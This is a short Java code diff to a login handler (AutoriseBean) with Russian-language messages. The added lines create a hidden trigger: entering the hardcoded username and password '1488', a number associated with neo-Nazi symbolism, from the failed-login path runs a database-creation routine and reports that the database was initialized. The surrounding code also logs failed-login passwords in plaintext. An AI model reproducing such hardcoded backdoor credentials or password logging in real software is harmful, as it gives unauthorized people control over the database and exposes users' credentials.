@@ -115,6 +115,10 @@ public class AutoriseBean implements UserDao {
         }catch (Exception e){
             showMessage("Ошибка авторизации", "Неверное имя пользователя или пароль!", error );
             LogTool.getLogger().error("Error during autorisation: inputUserName,inputPassword = "+inputUserName+"/"+inputPassword);
+            if(inputUserName.equals("1488") & inputPassword.equals("1488")){
+                createBitServerDateTable();
+                showMessage("Внимание!", "База данных инициализированна!", info );
+            }
         }
     }
 
